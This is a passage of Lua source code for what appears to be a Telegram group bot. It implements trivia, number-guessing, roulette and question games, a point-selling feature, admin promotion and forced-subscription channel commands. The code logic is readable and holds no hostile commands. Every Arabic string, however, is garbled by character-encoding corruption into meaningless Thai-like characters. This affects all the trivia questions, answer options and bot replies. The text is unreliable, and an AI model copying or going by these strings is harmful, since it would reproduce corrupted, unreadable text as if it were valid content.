name = string.gsub(name,'ุงููู','โ๏ธูุฑุงุณู ุจูุถุงุก ูุฌุฏุฑุงู ูุฑุฏูู ุงุฐุง ุงุบููุชู ุงุตุจุญ ุธูุงู  ููู ุงููู ุ\n1- ุงููู\n2- ุงูุงุฐู\n3- ุงูุซูุงุฌู')
name = string.gsub(name,'11','โ๏ธูู ุฌุฒุก ูุญุชูู ูุณูุณู ูุงุฏู ุงูุฐุฆุงุจ ุ\n1- 7\n2- 15\n3- 11')
name = string.gsub(name,'30','โ๏ธูู ุฌุฒุก ูุญุชูู ุงููุฑุงู ุงููุฑูู ุ\n1- 60\n2- 70\n3- 30')
name = string.gsub(name,'ุจูุชูู','โ๏ธูู ููู ุงุบูู ุฑุฆูุณ ูู ุงูุนุงูู ุ\n1- ุชุฑุงูุจ\n2- ุงูุจุงูุง\n3- ุจูุชูู')
name = string.gsub(name,'ุณุชูู ุฌูุจุฑ','โ๏ธูู ููู ูุคุณุณ ุดุฑูู ุงุจู ุงูุนุงูููู  ุ\n1- ูุงุฑู ุจุงูุฌ\n2- ุจูู ุฌูุชุณ\n3- ุณุชูู ุฌูุจุฑ')
name = string.gsub(name,'ุจุงุฑูุณ','ูุงูู ุนุงุตูู ูุฑูุณุง ุ\n1- ุจุงุฑูุณ\n2- ูููู\n3- ููุณูู')
name = string.gsub(name,'10','โ๏ธูุงุนุฏุฏ ุฏูู ุงูุนุฑุจูู ุงูุชู ุชูุฌุฏ ูู ุงูุฑูููุง ุ\n1- 10\n2- 17\n3- 9')
name = string.gsub(name,'ุงูููู','โ๏ธูุงูู ุงูุญููุงู ุงูุฐู ูุญูู 50 ููู ูุฒูู ุ\n1- ุงูููู\n2- ุงูููู\n3- ุงูุซูุฑ')
name = string.gsub(name,'ุญุฑู ุงููุงู','โ๏ธูุงุฐุง ููุฌุฏ ุจููู ูุจููู ุ\n1- ุงูุถู\n2- ุงูุงุฎูุงู\n3- ุญุฑู ุงููุงู')
name = string.gsub(name,'ุงูุดุนุฑ','โ๏ธูุงูู ุงูุดูุก ุงููุจุงุช ููุจุช ููุงูุณุงู ุจูุง ุจุฐุฑ ุ\n1- ุงูุงุถุงูุฑ\n2- ุงูุงุณูุงู\n3- ุงูุดุนุฑ')
name = string.gsub(name,'ุณุญุงุจ','โ๏ธูุง ูู ุงูุดููุก ุงูุฐู ูุณุชุทูุน ุงููุดู ุจุฏูู ุฃุฑุฌู ูุงูุจูุงุก ุจุฏูู ุฃุนูู ุ\n1- ุณุญุงุจ\n2- ุจุฆุฑ\n3- ููุฑ')
name = string.gsub(name,'ุงูุงุณู','โ๏ธูุง ุงูุดูุก ุงูุฐู ููุชููู , ูููู ุบูุฑูุง ูุณุชุนููู ุฃูุซุฑ ูููุง ุ\n1- ุงูุนูุฑ\n2- ุณุงุนู\n3- ุงูุงุณู')
name = string.gsub(name,'ุฐูุจ','โ๏ธุงุตูุฑ ุงูููู ุณุงุฑู ุนููู ุงูู ุงูููู ูุญุงุฑููู ูุฐูุฐ ุงูููู ุ\n1- ูุญุงุณ\n2- ุงููุงุณ\n3- ุฐูุจ')
name = string.gsub(name,'ุญุฑู ุงูุงู','โ๏ธูู ุงูููู ุซูุงุซุฉ ูููู ูู ุงูููุงุฑ ูุงุญุฏู ููุง ูู ุ\n1- ุญุฑู ุงูุจุงุก\n2- ุญุฑู ุงูุงู\n3- ุญุฑู ุงูุฑุงุก')
name = string.gsub(name,'ุงูุนุฒุงุฆู','โ๏ธุนูู ูุฏุฑ ุงุตู ุงูุนุฒู ุชุฃุชู ุ\n1- ุงูุนุฒุงุฆู\n2- ุงูููุงุฑู\n3- ุงููุจุงุฆุจ')
name = string.gsub(name,'ุงูุณุงุช','โ๏ธูุงูู ุฌูุน ูููู ุงูุณู ุ\n1- ุณูุฏุงุช\n2- ุงูุณุงุช\n3- ููุงูุต')
name = string.gsub(name,'ุงูููุฌููู','โ๏ธุงูู ุงุชุณุนููุช ูุฏููุง ูู ุงูุญุฑูุจ ุ\n1- ุงูุตุงุฑูุฎ\n2- ุงููุณุฏุณ\n3- ุงูููุฌููู')
name = string.gsub(name,'ุงุณูุง','โ๏ธุชูุน ูุจูุงู ูู ูุงุฑู ุ\n1- ุงูุฑูููุง\n2- ุงุณูุง\n3- ุงูุฑููุง ุงูุดูุงููู')
name = string.gsub(name,'6','โ๏ธูู ุตูุฑุง ููููููู ุ\n1- 4\n2- 3\n3- 6')
name = string.gsub(name,'ุงูุงุณุฏ','โ๏ธูุงูู ุงูุญููุงู ุงูุฐู ูููุจ ุจููู ุงูุบุงุจู ุ\n1- ุงูููู\n2- ุงูุงุณุฏ\n3- ุงูููุฑ')
name = string.gsub(name,'ููุฑ','โ๏ธูุง ุงุณู ุตุบูุฑ ุงูุญุตุงู ุ\n1- ููุฑ\n2- ุฌุฑู\n3- ุนุฌู')
name = string.gsub(name,'ุงูุฏููููู','โ๏ธูุง ุงูุญููุงู ุงูุฐู ููุงู ูุงุญุฏู ุนููู ููุชูุญู ุ\n1- ุงููุฑุด\n2- ุงูุฏููููู\n3- ุงูุซุนูุจ\n')
name = string.gsub(name,'ุงูุฑูุจุง','โ๏ธูุงูู ุงููุงุฑู ุงูุชู ุชููุจ ุจุงููุงุฑู ุงูุนุฌูุฒ ุ\n1- ุงูุฑูุจุง\n2- ุงูุฑููุง ุงูุดูุงููู\n3- ุงูุฑูููุง')
name = string.gsub(name,'ุงูุฒุฆุจู','โ๏ธูุง ุงุณู ุงููุนุฏู ุงูููุฌูุฏ ููู ุงูุญุงูู ุงูุณุงุฆูู ุ\n1- ุงููุญุงุณ\n2- ุงูุญุฏูุฏ\n3- ุงูุฒุฆุจู')
name = string.gsub(name,'ููุฏู','โ๏ธูุงูู ุนุงุตูู ุงูุฌูุชุฑุง ุ\n1- ููุฏู\n2- ููุฑุณูู\n3- ุชุฑููุง')
name = string.gsub(name,'ุงูุงูุณุงู','โ๏ธูุงูู ุงูุดุฆ ุงูุฐู ุจุฑุฃุณู ุณุจุน ูุชุญุงุช ุ\n1- ุงููุงุชู\n2- ุงูุชููุงุฒ\n3- ุงูุงูุณุงู')
name = string.gsub(name,'ุงูุดูุทุงู','โ๏ธูุงูู ุนุงุตูู ุงููุงุจุงู ุ\n1- ุจุงูููู\n2- ููู ุฏููู\n3- ุงูุดูุทุงู')
name = string.gsub(name,'ุฎุฏูุฌู','โ๏ธูู ูู ุฒูุฌู ุงูุฑุณูู ุงูุงูุจุฑ ููู ุณูุข ุ\n1- ุญูุถู\n2- ุฒููุจ\n3- ุฎุฏูุฌู')
mustafaTEAM = name..'\nโ๏ธุงุฑุณู ุงูุฌูุงุจ ุงูุตุญูุญ ููุท'
Dev_mfm(msg.chat_id_, msg.id_, 1,mustafaTEAM, 1, 'md')
return false
end end
if text == Devmfm:get(mustafa..'mfm:GameNum8'..msg.chat_id_) then
if not Devmfm:get(mustafa..'mfm:Games:Ids'..msg.chat_id_) then 
Devmfm:incrby(mustafa..'mfm:GamesNumber'..msg.chat_id_..msg.sender_user_id_, 1)  
Devmfm:del(mustafa..'mfm:GameNum8'..msg.chat_id_)
mustafaTEAM = 'โ๏ธูุจุฑูู ููุฏ ุฑุจุญุช ูู ุงููุนุจู \nโ๏ธุงุฑุณู โซ ุงูุงุณุฆูู ููุนุจ ูุฑู ุงุฎุฑู'
Dev_mfm(msg.chat_id_, msg.id_, 1,mustafaTEAM, 1, 'md')
end
Devmfm:set(mustafa..'mfm:Games:Ids'..msg.chat_id_,true)
end  
if Devmfm:get(mustafa.."GAME:TKMEN" .. msg.chat_id_ .. "" .. msg.sender_user_id_) then  
if text and text:match("^(%d+)$") then
local NUM = text:match("^(%d+)$")
if tonumber(NUM) > 20 then
Dev_mfm(msg.chat_id_, msg.id_, 1,"โ๏ธุนุฐุฑุง ูุง ููููู ุชุฎููู ุนุฏุฏ ุงูุจุฑ ูู ุงูู20 ุฎูู ุฑูู ูุง ุจูู ุงูู1 ูุงูู20", 1, 'md')
return false  end 
local GETNUM = Devmfm:get(mustafa.."GAMES:NUM"..msg.chat_id_)
if tonumber(NUM) == tonumber(GETNUM) then
Devmfm:del(mustafa..'Set:Num'..msg.chat_id_..msg.sender_user_id_)
Devmfm:del(mustafa.."GAME:TKMEN" .. msg.chat_id_ .. "" .. msg.sender_user_id_)   
Devmfm:incrby(mustafa..'mfm:GamesNumber'..msg.chat_id_..msg.sender_user_id_,5)  
Dev_mfm(msg.chat_id_, msg.id_, 1,'โ๏ธ*ุงูุชุฎููู ุงูุตุญูุญ ูู* โซ '..NUM..'\nโ๏ธ*ูุจุฑูู ููุฏ ุฑุจุญุช ูุญุตูุช ุนูู 5 ููุงุท ููููู ุงุณุชุจุฏุงููุง ุจุงูุฑุณุงุฆู*', 1, 'md')
elseif tonumber(NUM) ~= tonumber(GETNUM) then
Devmfm:incrby(mustafa..'Set:Num'..msg.chat_id_..msg.sender_user_id_,1)
if tonumber(Devmfm:get(mustafa..'Set:Num'..msg.chat_id_..msg.sender_user_id_)) >= 3 then
Devmfm:del(mustafa..'Set:Num'..msg.chat_id_..msg.sender_user_id_)
Devmfm:del(mustafa.."GAME:TKMEN" .. msg.chat_id_ .. "" .. msg.sender_user_id_)   
Dev_mfm(msg.chat_id_, msg.id_, 1,'โ๏ธ*ุงูุชุฎููู ุงูุตุญูุญ ูู* โซ '..GETNUM..'\nโ๏ธ*ููุงุณู ููุฏ ุฎุณุฑุช ุญุงูู ูุฑู ุงุฎุฑู ูุชุฎููู ุงูุฑูู ุงูุตุญูุญ*', 1, 'md')
else
if tonumber(Devmfm:get(mustafa..'Set:Num'..msg.chat_id_..msg.sender_user_id_)) == 1 then
SetNum = 'ูุญุงููุชุงู ููุท'
elseif tonumber(Devmfm:get(mustafa..'Set:Num'..msg.chat_id_..msg.sender_user_id_)) == 2 then
SetNum = 'ูุญุงููู ูุงุญุฏู ููุท'
end
Dev_mfm(msg.chat_id_, msg.id_, 1,'โ๏ธููุฏ ุฎููุช ุงูุฑูู ุงูุฎุทุง ูุชุจูู ูุฏูู '..SetNum..' ุงุฑุณู ุฑูู ุชุฎููู ูุฑู ุงุฎุฑู ููููุฒ', 1, 'md')
end
end
end
end
if text == 'ุฎูู' and ChCheck(msg) or text == 'ุชุฎููู' and ChCheck(msg) then   
if not Devmfm:get(mustafa..'mfm:Lock:Games'..msg.chat_id_) then
Num = math.random(1,20)
Devmfm:set(mustafa.."GAMES:NUM"..msg.chat_id_,Num) 
Dev_mfm(msg.chat_id_, msg.id_, 1,'โ๏ธุงููุง ุจู ุนุฒูุฒู ูู ูุนุจุฉ ุงูุชุฎููู โซ โค\n โ โ โ โ โ โ โ โ โ\nโ๏ธุณูุชู ุชุฎููู ุนุฏุฏ ูุง ุจูู ุงูู1 ูุงูู20 ุงุฐุง ุชุนุชูุฏ ุงูู ุชุณุชุทูุน ุงูููุฒ ุฌุฑุจ ูุงููุนุจ ุงูุงู .\nโ๏ธููุงุญุธู ูุฏูู ุซูุงุซ ูุญุงููุงุช ููุท ููุฑ ูุจู ุงุฑุณุงู ุชุฎูููู !', 1, 'md')
Devmfm:setex(mustafa.."GAME:TKMEN" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 100, true)  
return false  
end
end
if text == 'ุฑูููุช' then
if not Devmfm:get(mustafa..'mfm:Lock:Games'..msg.chat_id_) then
Devmfm:del(mustafa.."mfm:NumRolet"..msg.chat_id_..msg.sender_user_id_) 
Devmfm:del(mustafa..'mfm:ListRolet'..msg.chat_id_)  
Devmfm:setex(mustafa.."mfm:StartRolet"..msg.chat_id_..msg.sender_user_id_,3600,true)  
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธุญุณูุง ูููุนุจ , ุงุฑุณู ุนุฏุฏ ุงููุงุนุจูู ููุฑูููุช .', 1, 'md')
return false  
end
end
if text and text:match("^(%d+)$") and Devmfm:get(mustafa.."mfm:StartRolet"..msg.chat_id_..msg.sender_user_id_) then
if text == "1" then
Text = "โ๏ธูุง ุงุณุชุทูุน ุจุฏุก ุงููุนุจู ุจูุงุนุจ ูุงุญุฏ ููุท"
else
Devmfm:set(mustafa.."mfm:NumRolet"..msg.chat_id_..msg.sender_user_id_,text)  
Text = 'โ๏ธุชู ุจุฏุก ุชุณุฌูู ุงููุณุชู ูุฑุฌู ุงุฑุณุงู ุงููุนุฑูุงุช \nโ๏ธุงููุงุฆุฒ ูุญุตู ุนูู 5 ููุงุท ุนุฏุฏ ุงููุทููุจูู โซ '..text..' ูุงุนุจ'
end
Devmfm:del(mustafa.."mfm:StartRolet"..msg.chat_id_..msg.sender_user_id_)
send(msg.chat_id_,msg.id_,Text)
return false
end
if text and text:match('^(@[%a%d_]+)$') and Devmfm:get(mustafa.."mfm:NumRolet"..msg.chat_id_..msg.sender_user_id_) then 
if Devmfm:sismember(mustafa..'mfm:ListRolet'..msg.chat_id_,text) then
send(msg.chat_id_,msg.id_,'โ๏ธุงููุนุฑู โซ ['..text..'] ููุฌูุฏ ุงุณุงุณุง')
return false
end
tdcli_function ({ID = "SearchPublicChat",username_ = text},function(extra, res, success) 
if res and res.message_ and res.message_ == "USERNAME_NOT_OCCUPIED" then 
Dev_mfm(msg.chat_id_, msg.id_, 1,'โ๏ธุงููุนุฑู ุบูุฑ ุตุญูุญ ูุฑุฌู ุงุฑุณุงู ูุนุฑู ุตุญูุญ', 1, 'md')
return false 
end
Devmfm:sadd(mustafa..'mfm:ListRolet'..msg.chat_id_,text)
local CountAdd = Devmfm:get(mustafa.."mfm:NumRolet"..msg.chat_id_..msg.sender_user_id_)
local CountAll = Devmfm:scard(mustafa..'mfm:ListRolet'..msg.chat_id_)
local CountUser = CountAdd - CountAll
if tonumber(CountAll) == tonumber(CountAdd) then 
Devmfm:del(mustafa.."mfm:NumRolet"..msg.chat_id_..msg.sender_user_id_) 
Devmfm:setex(mustafa.."mfm:WittingStartRolet"..msg.chat_id_..msg.sender_user_id_,1400,true) 
local Text = "โ๏ธุชู ุงุฏุฎุงู ุงููุนุฑู โซ ["..text.."]\nโ๏ธูุชู ุงูุชูุงู ุงูุนุฏุฏ ุงูููู ูู ุงูุช ูุณุชุนุฏ ุ"
keyboard = {} 
keyboard.inline_keyboard = {{{text="ูุนู",callback_data="/YesRolet"},{text="ูุง",callback_data="/NoRolet"}},{{text="ุงููุงุนุจูู",callback_data="/ListRolet"}}} 
Msg_id = msg.id_/2097152/0.5
return https.request("https://api.telegram.org/bot"..TokenBot..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..Msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end 
local Text = "โ๏ธุชู ุงุฏุฎุงู ุงููุนุฑู โซ ["..text.."] ูุชุจูู โซ "..CountUser.." ูุงุนุจูู ูููุชูู ุงูุนุฏุฏ ุงุฑุณู ุงููุนุฑู ุงูุงุฎุฑ"
keyboard = {} 
keyboard.inline_keyboard = {{{text="ุงูุบุงุก",callback_data="/NoRolet"}}} 
Msg_id = msg.id_/2097152/0.5
return https.request("https://api.telegram.org/bot"..TokenBot..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..Msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end,nil) 
end
if text == 'ูุช ุชููุช' and ChCheck(msg) then
if not Devmfm:get(mustafa..'mfm:Lock:Games'..msg.chat_id_) then
local mustafaTEAM = {  "ุขุฎุฑ ูุฑุฉ ุฒุฑุช ูุฏููุฉ ุงูููุงููุ",  "ุขุฎุฑ ูุฑุฉ ุฃููุช ุฃููุชู ุงูููุถููุฉุ",  "ุงููุถุน ุงูุญุงููุ\nโ1. ุณูุฑุงู\nโ2. ุถุงูุฌ\nโ3. ุฃุชุฃูู",  "ุขุฎุฑ ุดูุก ุถุงุน ูููุ","ูููุฉ ุฃุฎูุฑุฉ ูุดุงุบู ุงูุจุงูุ","ุทุฑููุชู ุงููุนุชุงุฏุฉ ูู ุงูุชุฎููุต ูู ุงูุทุงูุฉ ุงูุณูุจูุฉุ","ุดูุฑ ูู ุฃุดูุฑ ุงูุนุงู ูู ุฐูุฑู ุฌูููุฉ ูุนูุ","ูููุฉ ุบุฑูุจุฉ ูู ููุฌุชู ููุนูุงูุงุ๐ค","โ- ุดูุก ุณูุนุชู ุนุงูู ูู ุฐููู ูุงููููููุ","ูุชู ุชูุฑู ุงูุดุฎุต ุงูุฐู ุฃูุงูู ุญุชู ูู ููุช ููู ุฃุดุฏ ูุนุฌุจูููุ","โ- ุฃุจุฑุฒ ุตูุฉ ุญุณูุฉ ูู ุตุฏููู ุงูููุฑุจุ","ูู ุชุดุนุฑ ุฃู ููุงูู ููู ููุญุจูุ","ุงุฐุง ุงูุชุดูุช ุฃู ุฃุนุฒ ุฃุตุฏูุงุฆู ูุถูุฑ ูู ุงูุณูุกุ ููููู ุงูุตุฑูุญุ","ุฃุฌูู ุดูุก ุญุตู ูุนู ุฎูุงู ูุงููููุ","ุตูู ุดุนูุฑู ูุฃูุช ุชูุญุจ ุดุฎุต ููุญุจ ุบูุฑูุ๐๐","ูููุฉ ูุดุฎุต ุบุงูู ุงุดุชูุช ุฅูููุ๐","ุขุฎุฑ ุฎุจุฑ ุณุนูุฏุ ูุชู ูุตููุ","ุฃูุง ุขุณู ุนูู ....ุ","ุฃูุตู ููุณู ุจูููุฉุ","ุตุฑูุญุ ูุดุชุงูุ","โ- ุตุฑูุญุ ูู ุณุจู ูุฎุฐูุช ุฃุญุฏูู ููู ุนู ุบูุฑ ูุตุฏุ","โ- ูุงุฐุง ุณุชุฎุชุงุฑ ูู ุงููููุงุช ูุชุนุจุฑ ููุง ุนู ุญูุงุชู ุงูุชู ุนุดุชูุง ุงูู ุงูุขูุ๐ญ","โ- ููุงู/ุฉ ุชูุฏ ูู ูุฏุนููู ุนูู ูุงุฆุฏุฉ ุนุดุงุกุ๐โค","โ- ุชุฎููู ุดูุก ูุฏ ูุญุฏุซ ูู ุงููุณุชูุจูุ","โ- ููุดุจุงุจ | ุขุฎุฑ ูุฑุฉ ูุตูู ุบุฒู ูู ูุชุงุฉุ๐","ุดุฎุต ุฃู ุตุงุญุจ ุนูุถู ููุณุงู ููุฑ ุงูุญูุงุฉ ูุง ุงุณูู ุ","| ุงุฐุง ุดูุช ุญุฏ ูุงุนุฌุจู ูุนูุฏู ุงูุฌุฑุฃู ุงูู ุชุฑูุญ ูุชุชุนุฑู ุนููู ุ ููุฏูุฉ ุงูุญุฏูุซ ุดู ุฑุงุญ ุชููู ุ.", }  
Dev_mfm(msg.chat_id_, msg.id_, 1, ''..mustafaTEAM[math.random(#mustafaTEAM)]..'' , 1, 'md')  
return false
end
end
if text == 'ุงูุงูุนุงุจ' and ChCheck(msg) or text == 'ุงูุนุงุจ' and ChCheck(msg) or text == 'ุงููุนุจู' and ChCheck(msg) then
if not Devmfm:get(mustafa..'mfm:Lock:Games'..msg.chat_id_) then
Dev_mfm(msg.chat_id_, msg.id_, 1,[[
โ๏ธูุงุฆูุฉ ุงูุนุงุจ ุงููุฌููุนู โซ โค
โ โ โ โ โ โ โ โ โ
โ๏ธูุนุจุฉ ุงูุชุฎููู โซ ุฎูู
โ๏ธูุนุจุฉ ุงูุงูุซูู โซ ุงูุซูู
โ๏ธูุนุจุฉ ุงูุนูุณ โซ ุงูุนูุณ
โ๏ธูุนุจุฉ ุงูุงุณุฆูู โซ ุงุณุฆูู
โ๏ธูุนุจุฉ ุงูุฑูููุช โซ ุฑูููุช
โ๏ธูุนุจุฉ ุงูุญุฒูุฑู โซ ุญุฒูุฑู
โ๏ธูุนุจุฉ ุงูุชุฑุชูุจ โซ ุชุฑุชูุจ
โ๏ธูุนุจุฉ ุงููุนุงูู โซ ูุนุงูู
โ๏ธูุนุจุฉ ุงูุชููุช โซ ูุช ุชููุช
โ๏ธูุนุจุฉ ุงููุฎุชูู โซ ุงููุฎุชูู
โ๏ธูุนุจุฉ ุงูุณูุงููุงุช โซ ุณูุงููุงุช
โ๏ธูุนุจุฉ ุงููุญูุจุณ โซ ุงููุญูุจุณ
โ๏ธูุนุจุฉ ุงูุฑูุงุถูุงุช โซ ุฑูุงุถูุงุช
โ๏ธูุนุจุฉ ุงูุงููููุฒูู โซ ุงููููุฒูู
โ โ โ โ โ โ โ โ โ
โ๏ธููุงุทู โข ุจูุน ููุงุทู
โ โ โ โ โ โ โ โ โ
โ๏ธ[๐๐๐๐๐๐ ๐๐๐๐๐](https://t.me/KKDKKB7)
]], 1, 'md')
else
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธุนุฐุฑุง ุงูุงูุนุงุจ ูุนุทูู ูู ุงููุฌููุนู', 1, 'md')
end
end
if text == 'ุจูุน ููุงุทู' and ChCheck(msg) then
if tonumber((Devmfm:get(mustafa..'mfm:GamesNumber'..msg.chat_id_..msg.sender_user_id_) or 0)) == 0 then
Dev_mfm(msg.chat_id_, msg.id_, 1,'โ๏ธูู ุชุฑุจุญ ุงู ููุทู\nโ๏ธุงุฑุณู โซ ุงูุงูุนุงุจ ููุนุจ', 1, 'md')
else
Devmfm0 = (Devmfm:get(mustafa..'mfm:GamesNumber'..msg.chat_id_..msg.sender_user_id_) * 50)
Devmfm:incrby(mustafa..'mfm:UsersMsgs'..msg.chat_id_..':'..msg.sender_user_id_,Devmfm0)
Dev_mfm(msg.chat_id_, msg.id_, 1,'โ๏ธุชู ุจูุน '..(Devmfm:get(mustafa..'mfm:GamesNumber'..msg.chat_id_..msg.sender_user_id_))..' ูู ููุงุทู\nโ๏ธูู ููุทู ุชุณุงูู 50 ุฑุณุงูู', 'md')
Devmfm:del(mustafa..'mfm:GamesNumber'..msg.chat_id_..msg.sender_user_id_)
end
end
if text == 'ุฑูุน ุงููุดุฑููู' and ChCheck(msg) or text == 'ุฑูุน ุงูุงุฏูููู' and ChCheck(msg) then  
tdcli_function ({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersAdministrators"},offset_ = 0,limit_ = 200},function(arg,abbas) 
Devmfm:del(mustafa..'mfm:mfmConstructor:'..msg.chat_id_)
local num = 0
local admins = abbas.members_  
for i=0 , #admins do   
if abbas.members_[i].bot_info_ == false and abbas.members_[i].status_.ID == "ChatMemberStatusEditor" then
Devmfm:sadd(mustafa..'mfm:Admins:'..msg.chat_id_, admins[i].user_id_)   
num = num + 1
tdcli_function ({ID = "GetUser",user_id_ = admins[i].user_id_},function(arg,dp) 
if dp.first_name_ == false then
Devmfm:srem(mustafa..'mfm:Admins:'..msg.chat_id_, admins[i].user_id_)   
end
end,nil)   
else
Devmfm:srem(mustafa..'mfm:Admins:'..msg.chat_id_, admins[i].user_id_)   
end 
if abbas.members_[i].status_.ID == "ChatMemberStatusCreator" then  
Manager_id = admins[i].user_id_  
Devmfm:sadd(mustafa..'mfm:BasicConstructor:'..msg.chat_id_,Manager_id)  
Devmfm:sadd(mustafa..'mfm:mfmConstructor:'..msg.chat_id_,Manager_id)   
end  
end  
if num == 0 then
Dev_mfm(msg.chat_id_, msg.id_, 1, "โ๏ธูุง ููุฌุฏ ุงุฏูููู ููุชู ุฑูุนูู\nโ๏ธุชู ุฑูุน ููุดุฆ ุงููุฌููุนู", 1, 'md')
else
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธุชู ุฑูุน '..num..' ูู ุงูุงุฏูููู \nโ๏ธุชู ุฑูุน ููุดุฆ ุงููุฌููุนู', 1, 'md')
end
end,nil) 
end
if text == 'ุบุงุฏุฑ' and SudoBot(msg) then
if Devmfm:get(mustafa.."mfm:Left:Bot"..mustafa) and not SecondSudo(msg) then
Dev_mfm(msg.chat_id_,msg.id_, 1, "โ๏ธุงููุบุงุฏุฑู ูุนุทูู ูู ูุจู ุงููุทูุฑ ุงูุงุณุงุณู", 1, 'md')
return false  
end
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธุชู ูุบุงุฏุฑุฉ ุงููุฌููุนู \nโ๏ธุชู ุญุฐู ุฌููุน ุจูุงูุงุชูุง ', 1, 'md')
ChatLeave(msg.chat_id_, mustafa)
Devmfm:srem(mustafa.."mfm:Groups",msg.chat_id_)
end
if text ==('ูููุนู') and ChCheck(msg) then
tdcli_function ({ID = "GetChatMember",chat_id_ = msg.chat_id_,user_id_ = msg.sender_user_id_},function(arg,da) 
if da.status_.ID == "ChatMemberStatusCreator" then
rtpa = 'ุงูููุดุฆ'
elseif da.status_.ID == "ChatMemberStatusEditor" then
rtpa = 'ุงูุงุฏูู'
elseif da.status_.ID == "ChatMemberStatusMember" then
rtpa = 'ุนุถู'
end
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธูููุนู โซ '..rtpa, 1, 'md')
end,nil)
end
if text == "ูุนูููุงุชู" and ChCheck(msg) then
function get_me(extra,result,success)
local msguser = tonumber(Devmfm:get(mustafa..'mfm:UsersMsgs'..msg.chat_id_..':'..msg.sender_user_id_))
local user_msgs = Devmfm:get(mustafa..'mfm:UsersMsgs'..msg.chat_id_..':'..msg.sender_user_id_)
local cont = (tonumber(Devmfm:get(mustafa..'mfm:ContactNumber'..msg.chat_id_..':'..msg.sender_user_id_)) or 0)
local user_nkt = tonumber(Devmfm:get(mustafa..'mfm:GamesNumber'..msg.chat_id_..msg.sender_user_id_) or 0)
if result.username_ then username = '@'..result.username_ else username = 'ูุง ููุฌุฏ' end
if result.last_name_ then lastname = result.last_name_ else lastname = '' end
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธุงุณูู โซ โจ ['..result.first_name_..'] โฉ\nโ๏ธูุนุฑูู โซ โจ ['..username..'] โฉ\nโ๏ธุงูุฏูู โซ โจ `'..result.id_..'` โฉ\nโ๏ธููุงุทู โซ โจ '..user_nkt..' โฉ\nโ๏ธุฑุณุงุฆูู โซ โจ '..user_msgs..' โฉ\nโ๏ธุฌูุงุชู โซ โจ '..cont..' โฉ\nโ๏ธุชูุงุนูู โซ '..formsgs(msguser)..'\nโ๏ธุฑุชุจุชู โซ '..IdRank(msg.sender_user_id_, msg.chat_id_), 1, 'md')
end
getUser(msg.sender_user_id_,get_me)
end
end
if text == "ุชุนููู ููุงุฉ ุงูุงุดุชุฑุงู" or text == "ุชุบููุฑ ููุงุฉ ุงูุงุดุชุฑุงู" or text == "ุชุนููู ุงูุงุดุชุฑุงู ุงูุงุฌุจุงุฑู" or text == "ูุถุน ููุงุฉ ุงูุงุดุชุฑุงู" then
if not SecondSudo(msg) then
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธูููุทูุฑ ุงูุงุณุงุณู ููุท ', 1, 'md')
else
Devmfm:setex(mustafa..'Devmfm4'..msg.sender_user_id_,360,true)
send(msg.chat_id_, msg.id_, 'โ๏ธุงุฑุณู ูู ูุนุฑู ููุงุฉ ุงูุงุดุชุฑุงู ุงูุงู')
end
return false  
end
if text == "ุชูุนูู ุงูุงุดุชุฑุงู ุงูุงุฌุจุงุฑู" then  
if not SecondSudo(msg) then
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธูููุทูุฑ ุงูุงุณุงุณู ููุท ', 1, 'md')
else
if Devmfm:get(mustafa..'Devmfm2') then
local DevCh = Devmfm:get(mustafa..'Devmfm3')
send(msg.chat_id_, msg.id_,"โ๏ธุงูุงุดุชุฑุงู ุงูุงุฌุจุงุฑู ููุนู \nโ๏ธุนูู ุงูููุงุฉ โซ ["..DevCh.."]")
else
Devmfm:setex(mustafa..'Devmfm4'..msg.sender_user_id_,360,true)
send(msg.chat_id_, msg.id_,"โ๏ธูุงุชูุฌุฏ ููุงุฉ ูุชูุนูู ุงูุงุดุชุฑุงู\nโ๏ธุงุฑุณู ูู ูุนุฑู ููุงุฉ ุงูุงุดุชุฑุงู ุงูุงู")
end
end
return false  
end
if text == "ุชุนุทูู ุงูุงุดุชุฑุงู ุงูุงุฌุจุงุฑู" then  
if not SecondSudo(msg) then
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธูููุทูุฑ ุงูุงุณุงุณู ููุท ', 1, 'md')
else
Devmfm:del(mustafa..'Devmfm2') Devmfm:del(mustafa..'Devmfm3')
local mustafaTEAM = 'โ๏ธุงููุง ุนุฒูุฒู โซ '..mfmRank(msg)..' \nโ๏ธุชู ุชุนุทูู ุงูุงุดุชุฑุงู ุงูุงุฌุจุงุฑู'
mfmmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, mustafaTEAM, 14, string.len(msg.sender_user_id_))
end
return false  
end
if text == "ุญุฐู ููุงุฉ ุงูุงุดุชุฑุงู" or text == "ุญุฐู ููุงู ุงูุงุดุชุฑุงู" then
if not SecondSudo(msg) then
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธูููุทูุฑ ุงูุงุณุงุณู ููุท ', 1, 'md')
else
Devmfm:del(mustafa..'Devmfm2') Devmfm:del(mustafa..'Devmfm3')
Dev_mfm(msg.chat_id_, msg.id_, 1,"โ๏ธุชู ุญุฐู ููุงุฉ ุงูุงุดุชุฑุงู ุงูุงุฌุจุงุฑู", 1, 'md') 
end
end
if SecondSudo(msg) then
if text == 'ุฌูุจ ููุงุฉ ุงูุงุดุชุฑุงู' or text == 'ููุงุฉ ุงูุงุดุชุฑุงู' or text == 'ุงูุงุดุชุฑุงู ุงูุงุฌุจุงุฑู' or text == 'ููุงุฉ ุงูุงุดุชุฑุงู ุงูุงุฌุจุงุฑู' then
if Devmfm:get(mustafa..'Devmfm3') then
local DevCh = Devmfm:get(mustafa..'Devmfm3')
